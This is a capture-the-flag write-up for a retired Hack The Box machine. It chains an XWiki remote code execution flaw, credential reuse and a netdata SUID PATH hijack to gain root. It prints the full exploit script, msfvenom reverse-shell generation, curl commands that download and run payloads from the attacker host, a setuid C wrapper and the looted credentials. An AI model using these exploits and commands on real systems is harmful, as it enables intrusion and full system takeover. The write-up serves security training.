---
title: 📝 HTB Editor Write-up
name: Editor
date: 2025-12-13
last_modified_at: 2025-12-13
difficulty: Easy
os: Linux
skills: Enumeration, Reverse Shell, Credential Looting, Privilege Escalation, SSH Local Port Forwarding, Password Reuse,
tools: rustscan, nmap, searchsploit, CVE-2025-24893, nc, CVE-2024-32019, msfvenom
published: true
---

![](images/Pasted%20image%2020250804132652.png)

## 🗂️ Summary

This box starts with an outdated **XWiki** instance on Jetty, vulnerable to CVE-2025-24893, which provides a straightforward unauthenticated RCE via Groovy payload injection in a crafted RSS request. Once I gained code execution, I caught a reverse shell as the `xwiki` user.

I found hardcoded database credentials in the `hibernate.cfg.xml` file, which happened to be valid SSH credentials for the `oliver` user. 

From there, local enumeration revealed that Oliver was part of the `netdata` group, and the installed version was vulnerable to CVE-2024-32019. This allowed me to abuse the SUID `ndsudo` binary by hijacking the `PATH`, and ultimately escalate to **root**.

## 📘 XWIKI

### 🔎 Recon

The **initial scan** revealed these open ports:
- `22/tcp`: OpenSSH 8.9p1
- `80/tcp`: nginx 1.18.0
- `8080/tcp`: Jetty 10.0.20

```
fcoomans@kali:~/htb/editor$ rustscan -a 10.10.11.80 --tries 5 --ulimit 10000 -- -sCV -oA editor_tcp_all
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports faster than you can say 'SYN ACK'

[~] The config file is expected to be at "/home/fcoomans/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.80:22
Open 10.10.11.80:80
Open 10.10.11.80:8080
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oA editor_tcp_all" on ip 10.10.11.80

<SNIP>

Nmap scan report for editor.htb (10.10.11.80)
Host is up, received echo-reply ttl 63 (0.17s latency).
Scanned at 2025-08-04 10:51:33 SAST for 14s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Editor - SimplistCode Pro
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20
|_http-open-proxy: Proxy might be redirecting requests
| http-title: XWiki - Main - Intro
|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/
|_http-server-header: Jetty(10.0.20)
| http-cookie-flags:
|   /:
|     JSESSIONID:
|_      httponly flag not set
| http-webdav-scan:
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Type: Jetty(10.0.20)
| http-robots.txt: 50 disallowed entries (40 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/
| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/
| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/
| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/
|_/xwiki/bin/logout/
| http-methods:
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

<SNIP>
```

After pointing `editor.htb` in `/etc/hosts`,

```
fcoomans@kali:~/htb/editor$ grep editor.htb /etc/hosts
10.10.11.80     editor.htb
```

I open the website at http://editor.htb and find that it's a site containing a Code Editor.

![](images/Pasted%20image%2020250804062023.png)

The `Docs` link redirects to http://wiki.editor.htb.  I add this to `/etc/hosts` as well.

```
fcoomans@kali:~/htb/editor$ grep editor.htb /etc/hosts
10.10.11.80     editor.htb wiki.editor.htb
```

Both http://editor.htb:8080/ and http://wiki.editor.htb points to the  XWIKI site for the SimplistCode Pro.
Notice the site path structure.  It's http://wiki.editor.htb/xwiki/bin/view/Main/ for the main page.  This will be important later.

![](images/Pasted%20image%2020250804132917.png)

The version used is `XWiki Debian 15.10.8`.

![](images/Pasted%20image%2020250804062550.png)

### 🧪 Exploitation

#### 🐞 CVE-2025-24893

`searchsploit` shows that there is a Remote Code Execution for XWiki 15.10.10 or earlier with EDB-ID 52136.

```
fcoomans@kali:~/htb/editor$ searchsploit xwiki
--------------------------------------------------- ---------------------------------
 Exploit Title                                     |  Path
--------------------------------------------------- ---------------------------------
XWiki 4.2-milestone-2 - Multiple Persistent Cross- | php/webapps/20856.txt
Xwiki CMS 12.10.2 - Cross Site Scripting (XSS)     | multiple/webapps/49437.txt
XWiki Platform 15.10.10 - Remote Code Execution    | multiple/webapps/52136.txt
XWiki Standard 14.10 - Remote Code Execution (RCE) | php/webapps/52105.py
--------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Looking at the exploit shows that this exploit is a PoC for `CVE-2025-24893`.

```
fcoomans@kali:~/htb/editor$ PAGER=cat searchsploit -x 52136 |head
  Exploit: XWiki Platform 15.10.10 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/52136
     Path: /usr/share/exploitdb/exploits/multiple/webapps/52136.txt
    Codes: CVE-2025-24893
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable
# Exploit Title: XWiki Platform - Remote Code Execution
# Exploit Author: Al Baradi Joy
# Exploit Date: April 6, 2025
# CVE ID: CVE-2025-24893
```

I tried the exploit supplied by  `searchsploit`, but didn't like the implementation as all commands had to be URL-encoded and added to the file.

I search and found another PoC by Artemir7 at https://github.com/Artemir7/CVE-2025-24893-EXP and cloned the repo.

```
fcoomans@kali:~/htb/editor$ git clone https://github.com/Artemir7/CVE-2025-24893-EXP
Cloning into 'CVE-2025-24893-EXP'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 12 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (12/12), 4.90 KiB | 1.63 MiB/s, done.
Resolving deltas: 100% (1/1), done.

fcoomans@kali:~/htb/editor$ cd CVE-2025-24893-EXP

fcoomans@kali:~/htb/editor/CVE-2025-24893-EXP$ python CVE-2025-24893-EXP.py

===========================================================
                   CVE-2025-24893
            XWiki Remote Code Execution Exploit
                      Author: Artemir
===========================================================

usage: CVE-2025-24893-EXP.py [-h] -u URL -c CMD
CVE-2025-24893-EXP.py: error: the following arguments are required: -u/--url, -c/--cmd
```

I modify the `exploit_path` on line 35 and prepend `xwiki/` to the path, as the main page showed that the structure is http://wiki.editor.htb/xwiki/bin/view/Main/ (notice the `xwiki` before `/bin/...`).
The variable was changed from:

```python
 35      exploit_path = f"bin/get/Main/SolrSearch?media=rss&text={encoded_payload}"
```

to:

```python
 35      exploit_path = f"xwiki/bin/get/Main/SolrSearch?media=rss&text={encoded_payload}"
```

Here is the full source code with the change.

{% raw %}
```python
fcoomans@kali:~/htb/editor/CVE-2025-24893-EXP$ nl -b a CVE-2025-24893-EXP.py
     1  import argparse
     2  import requests
     3  import re
     4  from urllib.parse import urljoin, quote
     5  import html
     6
     7  BANNER = """
     8  ===========================================================
     9                     CVE-2025-24893
    10              XWiki Remote Code Execution Exploit
    11                        Author: Artemir
    12  ===========================================================
    13  """
    14
    15  def extract_output(xml_text):
    16      decoded = html.unescape(xml_text)
    17      match = re.search(r"\[}}}(.*?)\]", decoded)
    18      if match:
    19          return match.group(1).strip()
    20      else:
    21          return None
    22
    23  def exploit(url, cmd):
    24      headers = {
    25          "User-Agent": "Mozilla/5.0",
    26      }
    27
    28      payload = (
    29          "}}}{{async async=false}}{{groovy}}"
    30          f"println('{cmd}'.execute().text)"
    31          "{{/groovy}}{{/async}}"
    32      )
    33
    34      encoded_payload = quote(payload)
    35      exploit_path = f"xwiki/bin/get/Main/SolrSearch?media=rss&text={encoded_payload}"
    36      full_url = urljoin(url, exploit_path)
    37
    38      try:
    39          response = requests.get(full_url, headers=headers, timeout=10)
    40          if response.status_code == 200:
    41              output = extract_output(response.text)
    42              if output:
    43                  print("[+] Command Output:")
    44                  print(output)
    45              else:
    46                  print("[!] Exploit sent, but output could not be extracted.")
    47                  print("[*] Raw response (truncated):")
    48                  print(response.text[:500])
    49          else:
    50              print(f"[-] Failed with status code: {response.status_code}")
    51      except requests.RequestException as e:
    52          print(f"[-] Request failed: {e}")
    53
    54  if __name__ == "__main__":
    55      print(BANNER)
    56      parser = argparse.ArgumentParser(description="CVE-2025-24893 - XWiki RCE PoC")
    57      parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g. http://example.com)")
    58      parser.add_argument("-c", "--cmd", required=True, help="Command to execute")
    59
    60      args = parser.parse_args()
    61      exploit(args.url, args.cmd)
```
{% endraw %}

The exploit was executed with the `cat /etc/passwd` command and the password file contents was returned.

```
fcoomans@kali:~/htb/editor/CVE-2025-24893-EXP$ python CVE-2025-24893-EXP.py -u http://wiki.editor.htb -c "cat /etc/passwd"

===========================================================
                   CVE-2025-24893
            XWiki Remote Code Execution Exploit
                      Author: Artemir
===========================================================

[+] Command Output:
root:x:0:0:root:/root:/bin/bash<br/>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br/>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br/>sync:x:4:65534:sync:/bin:/bin/sync<br/>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br/>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br/>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br/>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br/>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br/>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br/>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br/>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br/>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br/>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br/>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br/>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br/>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br/>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br/>systemd-network:x:101:102:systemd Network Management<sub>,:/run/systemd:/usr/sbin/nologin<br/>systemd-resolve:x:102:103:systemd Resolver</sub>,:/run/systemd:/usr/sbin/nologin<br/>messagebus:x:103:104::/nonexistent:/usr/sbin/nologin<br/>systemd-timesync:x:104:105:systemd Time Synchronization<sub>,:/run/systemd:/usr/sbin/nologin<br/>pollinate:x:105:1::/var/cache/pollinate:/bin/false<br/>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin<br/>syslog:x:107:113::/home/syslog:/usr/sbin/nologin<br/>uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin<br/>tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin<br/>tss:x:110:116:TPM software stack</sub>,:/var/lib/tpm:/bin/false<br/>landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin<br/>fwupd-refresh:x:112:118:fwupd-refresh user<sub>,:/run/systemd:/usr/sbin/nologin<br/>usbmux:x:113:46:usbmux daemon</sub>,:/var/lib/usbmux:/usr/sbin/nologin<br/>lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false<br/>dnsmasq:x:114:65534:dnsmasq<sub>,:/var/lib/misc:/usr/sbin/nologin<br/>mysql:x:115:121:MySQL Server</sub>,:/nonexistent:/bin/false<br/>tomcat:x:998:998:Apache Tomcat:/var/lib/tomcat:/usr/sbin/nologin<br/>xwiki:x:997:997:XWiki:/var/lib/xwiki:/usr/sbin/nologin<br/>netdata:x:996:999:netdata:/opt/netdata:/usr/sbin/nologin<br/>oliver:x:1000:1000:<sub>,:/home/oliver:/bin/bash<br/>_laurel:x:995:995::/var/log/laurel:/bin/false</sub>
```

Next, the `id` command was run and returned the user id as `xwiki`.

```
fcoomans@kali:~/htb/editor/CVE-2025-24893-EXP$ python CVE-2025-24893-EXP.py -u http://wiki.editor.htb -c "id"

===========================================================
                   CVE-2025-24893
            XWiki Remote Code Execution Exploit
                      Author: Artemir
===========================================================

[+] Command Output:
uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)
```

I use `msfvenom` to create a reverse shell and serve the reverse shell using the Python web server.

```
fcoomans@kali:~/htb/editor$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.131 LPORT=4444 EXITFUNC=thread -f elf -o www/revshell
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: www/revshell

fcoomans@kali:~/htb/editor$ python -m http.server -d www
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

A `nc` listener is started on Kali to catch the reverse shell.

```
fcoomans@kali:~/htb/editor$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
```

I then used the exploit to download the reverse shell, change the file permissions to make it executable and then run the reverse shell.

```
fcoomans@kali:~/htb/editor/CVE-2025-24893-EXP$ python CVE-2025-24893-EXP.py -u http://wiki.editor.htb -c "curl http://10.10.14.131:8000/revshell -o /tmp/revshell"

fcoomans@kali:~/htb/editor/CVE-2025-24893-EXP$ python CVE-2025-24893-EXP.py -u http://wiki.editor.htb -c "chmod +x /tmp/revshell"

fcoomans@kali:~/htb/editor/CVE-2025-24893-EXP$ python CVE-2025-24893-EXP.py -u http://wiki.editor.htb -c "/tmp/revshell"
```

#### 👣 Foothold as xwiki

The `nc` listener caught the reverse shell.

```
fcoomans@kali:~/htb/editor$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.131] from (UNKNOWN) [10.10.11.80] 51194
id
uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)
```

I found the mySQL password in `/usr/lib/xwiki-jetty/webapps/xwiki/WEB-INF/hibernate.cfg.xml`.  The password is `theEd1t0rTeam99`.

```
xwiki@editor:/usr/lib/xwiki-jetty/webapps/xwiki/WEB-INF$ cat hibernate.cfg.xml

<SNIP>

    <!-- Configuration for the default database.
         Comment out this section and uncomment other sections below if you want to use another database.
         Note that the database tables will be created automatically if they don't already exist.

         If you want the main wiki database to be different than "xwiki" (or the default schema for schema based
         engines) you will also have to set the property xwiki.db in xwiki.cfg file
    -->
    <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property>
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.driver_class">com.mysql.cj.jdbc.Driver</property>
    <property name="hibernate.dbcp.poolPreparedStatements">true</property>
    <property name="hibernate.dbcp.maxOpenPreparedStatements">20</property>

<SNIP>
```

Looking at `/etc/passwd` revealed that users with shell access on the target were `root` and `oliver`.

```
xwiki@editor:/usr/lib/xwiki-jetty$ grep sh /etc/passwd
grep sh /etc/passwd
root:x:0:0:root:/root:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
```

#### 🔼 PrivEsc as oliver

I try to SSH to the target as user `oliver` and the password `theEd1t0rTeam99` and I gain access.

```
fcoomans@kali:~/htb/editor$ ssh oliver@editor.htb

<SNIP>

oliver@editor:~$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

### 💰 Post Exploitation

#### 🚩 user.txt

Oliver is the holder of the `user.txt` flag.

```
oliver@editor:~$ cat /home/oliver/user.txt
853312b13fcae737181c23bd761e4683
```

## 📈 netdata

### 🔎 Recon

Oliver is a member of the `netdata` group.

```
oliver@editor:~$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

The `netdata` application was located under `/opt/netdata` and the configuration file showed that its listening on port `19999`.

```
oliver@editor:~$ grep "default port" /opt/netdata/etc/netdata/netdata.conf
        # default port = 19999
        # default port = 8125
```

`netstat` confirmed that the `netdata` application was listening on `127.0.0.1:19999`.

```
oliver@editor:~$ netstat -tlpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:43323         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8125          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:19999         0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::8080                 :::*                    LISTEN      -
tcp6       0      0 127.0.0.1:8079          :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

After an SSH port forward to my attack host.

```
fcoomans@kali:~/htb/editor$ ssh -L 127.0.0.1:19999:127.0.0.1:19999 oliver@editor.htb
```

Allowed me to access the `netdata` website, which revealed that the server is running version `1.45.2`.

![](images/Pasted%20image%2020250804125426.png)

### 🧪 Exploitation

#### 🐞 CVE-2024-32019

A quick google search showed that this version was vulnerable to CVE-2024-32019

According to https://nvd.nist.gov/vuln/detail/CVE-2024-32019 the `ndsudo` file is installed with the SUID bit set and the commands that it runs can be overwritten by manipulating the `PATH` variable.

```
Netdata is an open source observability tool. In affected versions the `ndsudo` tool shipped with affected versions of the Netdata Agent allows an attacker to run arbitrary programs with root permissions. The `ndsudo` tool is packaged as a `root`-owned executable with the SUID bit set. It only runs a restricted set of external commands, but its search paths are supplied by the `PATH` environment variable. This allows an attacker to control where `ndsudo` looks for these commands, which may be a path the attacker has write access to. This may lead to local privilege escalation. This vulnerability has been addressed in versions 1.45.3 and 1.45.2-169. Users are advised to upgrade. There are no known workarounds for this vulnerability.
```

`find` confirms that the file is installed with the SUID set.

```
oliver@editor:/opt/netdata$ find . -name 'ndsudo' |xargs ls -lh
-rwsr-x--- 1 root netdata 196K Apr  1  2024 ./usr/libexec/netdata/plugins.d/ndsudo
```

And looking at the `--help` page shows some flags that can be run using `ndsudo` as well as the corresponding executable that will be executed.

```
oliver@editor:/opt/netdata/usr/libexec/netdata/plugins.d$ ./ndsudo --help

ndsudo

(C) Netdata Inc.

A helper to allow Netdata run privileged commands.

  --test
    print the generated command that will be run, without running it.

  --help
    print this message.

The following commands are supported:

- Command    : nvme-list
  Executables: nvme
  Parameters : list --output-format=json

- Command    : nvme-smart-log
  Executables: nvme
  Parameters : smart-log {{device}} --output-format=json

- Command    : megacli-disk-info
  Executables: megacli MegaCli
  Parameters : -LDPDInfo -aAll -NoLog

- Command    : megacli-battery-info
  Executables: megacli MegaCli
  Parameters : -AdpBbuCmd -aAll -NoLog

- Command    : arcconf-ld-info
  Executables: arcconf
  Parameters : GETCONFIG 1 LD

- Command    : arcconf-pd-info
  Executables: arcconf
  Parameters : GETCONFIG 1 PD

The program searches for executables in the system path.

Variables given as {{variable}} are expected on the command line as:
  --variable VALUE

VALUE can include space, A-Z, a-z, 0-9, _, -, /, and .
```

I once again use `msfvenom` to create a reverse shell.

```
fcoomans@kali:~/htb/editor$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.131 LPORT=4444 EXITFUNC=thread -f elf -o www/revshell
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: www/revshell
```

A `nc` listener is started on the attack host.

```
fcoomans@kali:~/htb/editor$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
```

I then create the `nvme.c` source code to make use of the SUID and set the user to `root` (0) and then execute `revshell`, which will be located under `/dev/shm/revshell` on the target.  The file is compiled to `nvme` as this is the executable that will be run if when the `nvme-list` parameter is used with `ndsudo`.

```
fcoomans@kali:~/htb/editor/www$ cat nvme.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
  setuid(0);
  setgid(0);
  system("/dev/shm/revshell");
  return 0;
}

fcoomans@kali:~/htb/editor/www$ gcc -o nvme nvme.c
```

Both files are served on a Python web server.

```
fcoomans@kali:~/htb/editor$ python -m http.server -d www
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Both files are downloaded to the target and saved under `/dev/shm`.  The permissions are also changed to make both files executable.

```
oliver@editor:/opt/netdata/usr/libexec/netdata/plugins.d$ curl -s http://10.10.14.131:8000/revshell -o /dev/shm/revshell
oliver@editor:/opt/netdata/usr/libexec/netdata/plugins.d$ curl -s http://10.10.14.131:8000/nvme -o /dev/shm/nvme
oliver@editor:/opt/netdata/usr/libexec/netdata/plugins.d$ chmod +x /dev/shm/revshell
oliver@editor:/opt/netdata/usr/libexec/netdata/plugins.d$ chmod +x /dev/shm/nvme
```

To exploit the vulnerability, I run `PATH=/dev/shm ./ndsudo nvme-list` from `/opt/netdata/usr/libexec/netdata/plugins.d`.  This will change the `PATH` variable to `/dev/shm`, which tells `ndsudo` to look for the executable to run under `/dev/shm`.  The `nvme-list` parameter tells `ndsudo` to run the executable `/dev/shm/nvme`.  This executable will use the SUID and run `/dev/shm/revshell`.

```
oliver@editor:/opt/netdata/usr/libexec/netdata/plugins.d$ PATH=/dev/shm ./ndsudo nvme-list
```

The `nc` listener catches the reverse shell.

```
fcoomans@kali:~/htb/editor$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.131] from (UNKNOWN) [10.10.11.80] 35320
id
uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(oliver)
```

### 💰 Post Exploitation

#### 🏆 root.txt

`root` is the holder of the `root.txt` flag.

```
python3 -c "import pty;pty.spawn('/bin/bash')"
root@editor:/opt/netdata/usr/libexec/netdata/plugins.d# cd /root
cd /root
root@editor:/root# cat /root/root.txt
cat /root/root.txt
0ca08f670f506e32f2f5af0aff88e9e2
```

If keeping software updated sounds like too much work, don't worry — attackers will automate it for you. 📦💣

And `Editor has been Pwned!` 🎉

![](images/Pasted%20image%2020250804132507.png)

## 📚 Lessons Learned

- **Outdated software is still low-hanging fruit**. Whether it’s XWiki or netdata, neglecting updates gives attackers a front door (XWiki RCE) _and_ root (netdata SUID flaw).
- **Credential reuse is a privilege escalation time bomb**. Using the same MySQL password for SSH access gave away Oliver’s user account without a fight.
- **SUID binaries remain a juicy target**, especially when combined with poorly enforced restrictions or poor update hygiene.
- **Don’t assume non-admin users are safe**. Just being in a group like `netdata` was enough to chain to root—group memberships matter.

## ⚠️ Disclaimer

This write-up covers a retired HTB machine and is for educational purposes only. All IPs, credentials, and flags exist in a lab environment. My username matches my GitHub handle and is intentionally used to build my cybersecurity brand.